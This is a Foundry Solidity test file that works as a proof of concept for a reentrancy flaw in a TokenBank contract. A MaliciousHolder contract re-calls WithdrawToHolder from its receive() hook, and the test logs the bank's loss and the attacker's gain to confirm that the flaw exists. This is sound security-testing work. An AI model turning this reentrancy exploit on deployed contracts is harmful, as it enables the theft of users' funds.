// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract MaliciousHolder {
    TokenBank public bank;
    bool private reentered;

    constructor(TokenBank _bank) payable {
        bank = _bank;
        reentered = false;
    }

    function depositOwnFunds() public payable {
        bank.Deposit{value: 1 ether}();
    }

    function attack() public {
        bank.WithdrawToHolder(address(this), 1 ether);
    }

    function confirmOwner() public {
        bank.confirmOwner();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            bank.WithdrawToHolder(address(this), 1 ether);
        }
    }
}

contract TokenBankReentrancyTest is Test {
    TokenBank public bank;
    MaliciousHolder public attacker;

    function setUp() public {
        bank = new TokenBank();
        attacker = new MaliciousHolder(bank);
    }

    function testReentrancyVulnerability() public {
        // Transfer ownership to the attacker contract
        bank.changeOwner(address(attacker));
        attacker.confirmOwner();

        // Get initial bank balance after deployment
        uint initialBankBalance = address(bank).balance;
        
        // Deposit 1 ETH from test contract
        vm.deal(address(this), 1 ether);
        bank.Deposit{value: 1 ether}();

        // Deposit 1 ETH from attacker contract
        deal(address(attacker), 1 ether);
        attacker.depositOwnFunds{value: 0}();

        // Record pre-attack balances for differential validation
        uint preAttackBankBalance = address(bank).balance;
        uint preAttackAttackerBalance = address(attacker).balance;

        // BEGIN DIFFERENTIAL VALIDATION
        console.log("--- BEFORE-Trigger: Bank/Attacker Balances ---");
        console.log("Bank Balance: %d wei", preAttackBankBalance);
        console.log("Attacker Balance: %d wei", preAttackAttackerBalance);

        console.log("--- Trigger: Calling attacker.attack() ---");
        attacker.attack();

        // Record post-attack balances for differential comparison
        uint postAttackBankBalance = address(bank).balance;
        uint postAttackAttackerBalance = address(attacker).balance;
        
        console.log("--- AFTER-Trigger: Bank/Attacker Balances ---");
        console.log("Bank Balance: %d wei", postAttackBankBalance);
        console.log("Attacker Balance: %d wei", postAttackAttackerBalance);

        // Calculate balance changes
        uint bankBalanceLoss = preAttackBankBalance - postAttackBankBalance;
        uint attackerBalanceGain = postAttackAttackerBalance - preAttackAttackerBalance;
        
        console.log("Bank Balance Change: -%d wei", bankBalanceLoss);
        console.log("Attacker Balance Change: +%d wei", attackerBalanceGain);
        
        // Final vulnerability verdict
        if (bankBalanceLoss == 2 ether && attackerBalanceGain == 2 ether) {
            console.log("Vulnerability Exists: Reentrancy");
        } else {
            console.log("Vulnerability not Exist: Unexpected balance changes");
        }
        // END DIFFERENTIAL VALIDATION
    }
}